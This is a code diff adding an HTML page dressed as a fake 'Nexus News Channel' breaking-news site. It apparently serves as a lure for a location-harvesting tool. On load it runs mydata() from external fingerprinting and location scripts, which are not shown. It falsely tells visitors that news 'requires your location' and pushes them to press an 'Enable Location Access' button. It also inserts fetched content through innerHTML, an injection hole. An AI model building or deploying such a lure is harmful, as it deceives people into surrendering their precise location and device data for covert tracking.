@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Breaking News - Local News Channel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #fff;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        .breaking-banner {
+            background: #ff0000;
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 24px;
+            animation: blink 1s infinite;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .news-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+        }
+        
+        .news-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .news-header h1 {
+            font-size: 48px;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        
+        .news-header p {
+            font-size: 18px;
+            opacity: 0.9;
+        }
+        
+        .news-card {
+            background: rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        
+        .news-card h2 {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #ffd700;
+        }
+        
+        .news-card p {
+            font-size: 18px;
+            line-height: 1.8;
+            margin-bottom: 20px;
+        }
+        
+        .location-prompt {
+            background: rgba(255,255,255,0.15);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            margin-top: 30px;
+        }
+        
+        .location-prompt h3 {
+            font-size: 24px;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+        
+        .location-prompt p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+        
+        .btn-location {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 4px 15px rgba(255,0,0,0.4);
+        }
+        
+        .btn-location:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(255,0,0,0.6);
+        }
+        
+        .news-ticker {
+            background: rgba(0,0,0,0.5);
+            padding: 10px;
+            overflow: hidden;
+            white-space: nowrap;
+            margin-bottom: 20px;
+        }
+        
+        .ticker-content {
+            display: inline-block;
+            animation: scroll 30s linear infinite;
+        }
+        
+        @keyframes scroll {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+        
+        .live-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #ff0000;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/location.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+</head>
+<body onload="mydata()">
+    <div class="breaking-banner">
+        🔴 BREAKING NEWS - LIVE COVERAGE
+    </div>
+    
+    <div class="news-ticker">
+        <div class="ticker-content">
+            <span class="live-indicator"></span>
+            Major developments happening in your area • Local news coverage requires your location for accurate reporting • Stay informed with real-time updates
+        </div>
+    </div>
+    
+    <div class="news-container">
+        <div class="news-header">
+            <h1>📺 NEXUS NEWS CHANNEL</h1>
+            <p>Your Trusted Source for Local Breaking News</p>
+        </div>
+        
+        <div id="newsCards">
+            <!-- News items will be loaded dynamically here -->
+            <div class="news-card">
+                <h2>Loading news...</h2>
+                <p>Please wait while we load the latest news.</p>
+            </div>
+        </div>
+        
+        <div class="location-prompt">
+            <h3>📍 Enable Location for Personalized News</h3>
+            <p>
+                Click the button below to allow location access and receive 
+                customized news coverage for your area. This helps us deliver 
+                the most relevant breaking news to you.
+            </p>
+            <button id="change" class="btn-location" onclick="locate()">
+                Enable Location Access
+            </button>
+            <div id="result" style="margin-top: 20px; font-size: 14px; opacity: 0.8;"></div>
+        </div>
+        
+        <script>
+            // Load news location items dynamically
+            function loadLocationNews() {
+                fetch('../../news_api.php?type=news_location')
+                    .then(response => response.json())
+                    .then(data => {
+                        const newsContainer = document.getElementById('newsCards');
+                        newsContainer.innerHTML = '';
+                        
+                        if (data.error) {
+                            newsContainer.innerHTML = '<div class="news-card"><h2>Error loading news</h2><p>' + data.error + '</p></div>';
+                            return;
+                        }
+                        
+                        data.forEach(item => {
+                            const newsCard = document.createElement('div');
+                            newsCard.className = 'news-card';
+                            
+                            const title = document.createElement('h2');
+                            title.textContent = item.title;
+                            
+                            const content = document.createElement('p');
+                            content.innerHTML = item.content.replace(/\n/g, '<br>');
+                            
+                            newsCard.appendChild(title);
+                            newsCard.appendChild(content);
+                            
+                            if (item.timestamp) {
+                                const timestamp = document.createElement('div');
+                                timestamp.style.cssText = 'font-size: 14px; color: #ffd700; margin-top: 15px; opacity: 0.8;';
+                                timestamp.textContent = '⏰ ' + item.timestamp;
+                                newsCard.appendChild(timestamp);
+                            }
+                            
+                            newsContainer.appendChild(newsCard);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error loading location news:', error);
+                        document.getElementById('newsCards').innerHTML = 
+                            '<div class="news-card"><h2>Error loading news</h2><p>Unable to load news items. Please check your connection.</p></div>';
+                    });
+            }
+            
+            // Load news when page is ready
+            window.addEventListener('load', function() {
+                loadLocationNews();
+            });
+        </script>
+    </div>
+</body>
+</html>
+
